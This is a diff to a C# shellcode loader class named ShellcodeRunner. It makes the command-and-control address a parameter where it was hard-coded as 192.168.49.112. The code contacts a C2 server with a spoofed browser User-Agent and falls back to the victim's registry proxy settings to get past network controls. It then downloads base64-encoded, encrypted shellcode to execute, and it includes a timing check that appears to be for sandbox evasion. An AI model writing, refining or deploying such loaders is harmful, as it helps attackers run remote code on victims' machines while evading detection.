@@ -30,10 +30,13 @@ public class ShellcodeRunner
         return (DateTime.Now.Subtract(now).TotalSeconds < 1.5);
     }
 
-    private static WebClient GetWebClient()
+    private static WebClient GetWebClient(string address)
     {
         if (wc != null)
             return wc;
+
+        Uri uri = new Uri(address);
+        string baseUri = String.Format("{0}://{1}:{2}/", uri.Scheme, uri.Host, uri.Port);
 
         wc = new WebClient();
         try
@@ -41,7 +44,7 @@ public class ShellcodeRunner
             // Attempt direct access to C2 server
             wc.Headers.Add("User-Agent", "Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 KHTML, like Gecko) Chrome/111.0.0.0 Safari/537.36");
             wc.Proxy = null;
-            wc.DownloadString("http://192.168.49.112/");
+            wc.DownloadString(baseUri);
         }
         catch
         {
@@ -50,7 +53,7 @@ public class ShellcodeRunner
                 // Enable automatic proxy when callback to the C2 server fails
                 wc = new WebClient();
                 wc.Headers.Add("User-Agent", "Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 KHTML, like Gecko) Chrome/111.0.0.0 Safari/537.36");
-                wc.DownloadString("http://192.168.49.112/");
+                wc.DownloadString(baseUri);
             }
             catch
             {
@@ -65,7 +68,7 @@ public class ShellcodeRunner
 
                 string subKey = sid + "\\Software\\Microsoft\\Windows\\CurrentVersion\\Internet Settings\\";
                 string proxyAddr = (string)Registry.Users.OpenSubKey(subKey, false).GetValue("ProxyServer");
-                wc.Proxy = new WebProxy("http://" + proxyAddr);
+                wc.Proxy = new WebProxy(String.Format("{0}://{1}", uri.Scheme, proxyAddr));
             }
         }
 
@@ -75,7 +78,7 @@ public class ShellcodeRunner
     private static byte[] LoadShellcode(string address)
     {
         // Download shellcode from C2
-        byte[] shellcode = GetWebClient().DownloadData(address);
+        byte[] shellcode = GetWebClient(address).DownloadData(address);
 
         // Decode and decrypt shellcode
         shellcode = Convert.FromBase64String(Encoding.Default.GetString(shellcode));
